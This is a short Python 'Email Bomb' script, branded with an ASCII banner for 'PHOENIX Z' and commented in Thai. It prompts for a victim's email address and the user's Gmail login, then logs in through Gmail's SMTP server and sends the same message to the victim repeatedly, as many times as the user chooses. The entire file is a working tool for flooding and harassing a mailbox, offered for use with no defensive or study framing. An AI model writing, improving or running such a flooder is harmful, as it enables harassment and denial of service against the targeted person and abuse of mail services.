import smtplib
import time
print ("\033[1;31m _/_/_/    _/    _/    _/_/    _/_/_/_/  _/      _/  _/_/_/  _/      _/      _/_/_/_/_/                                       \033[1;m")
print ("\033[1;34m_/    _/  _/    _/  _/    _/  _/        _/_/    _/    _/      _/  _/              _/         Create By PHOENIX Z              \033[1;m")
print ("\033[1;34m_/_/_/    _/_/_/_/  _/    _/  _/_/_/    _/  _/  _/    _/        _/              _/               Email Bomb                   \033[1;m")
print ("\033[1;34m_/        _/    _/  _/    _/  _/        _/    _/_/    _/      _/  _/          _/              								\033[1;m")
print ("\033[1;31m_/        _/    _/    _/_/    _/_/_/_/  _/      _/  _/_/_/  _/      _/      _/_/_/_/_/    									\033[1;m")
print ("\033[1;31m|   YouTube : PHOENIX Z   																									\033[1;m")

try:
    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")   # Target ที่เราจะโจมตี
    email = input("Enter your gmail_address:")    #ใส่  Email ของเรา
    password = input("Enter your gmail_password:")  #ใส่ password
    message = input("Enter Message:")   #ใส่ข้อความ
    counter = int(input("How many message you want to send?:"))  #ต้องการส่งเป็นจำนวนเท่าไร

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)         #จำนวนข้อความที่เราส่งไป
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Error Try-Again later.")    # Error